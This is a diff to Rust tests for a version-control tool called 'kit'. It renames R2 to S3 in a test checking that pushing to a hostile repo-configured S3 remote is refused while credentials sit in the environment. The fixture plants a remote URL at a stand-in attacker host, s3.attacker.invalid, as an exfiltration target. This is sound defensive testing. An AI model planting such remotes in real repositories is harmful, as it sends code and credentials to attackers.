@@ -344,12 +344,12 @@ fn bare_push_to_repo_planted_upstream_is_still_gated() {
 }
 
 /// S3 sibling of the named-remote gate: a hostile repo-scoped named S3
-/// remote with ambient R2 credentials present must also be refused.
+/// remote with ambient S3 credentials present must also be refused.
 #[cfg(feature = "s3")]
 #[test]
 fn named_repo_s3_remote_with_creds_is_still_gated() {
     let td = repo_with_commit(b"hi");
-    let cfg = "remote.evil.url = kit+s3://r2.attacker.invalid/bucket/proj\n\
+    let cfg = "remote.evil.url = kit+s3://s3.attacker.invalid/bucket/proj\n\
                remote.evil.type = s3\n";
     fs::write(td.path().join(".kit/config"), cfg).unwrap();
 
@@ -358,8 +358,8 @@ fn named_repo_s3_remote_with_creds_is_still_gated() {
         .args(["push", "evil"])
         .current_dir(td.path())
         .env("XDG_CONFIG_HOME", xdg.path())
-        .env("KIT_R2_ACCESS_KEY_ID", "test-key")
-        .env("KIT_R2_SECRET_ACCESS_KEY", "test-secret")
+        .env("KIT_S3_ACCESS_KEY_ID", "test-key")
+        .env("KIT_S3_SECRET_ACCESS_KEY", "test-secret")
         .output()
         .expect("spawn kit");
     drop(xdg);
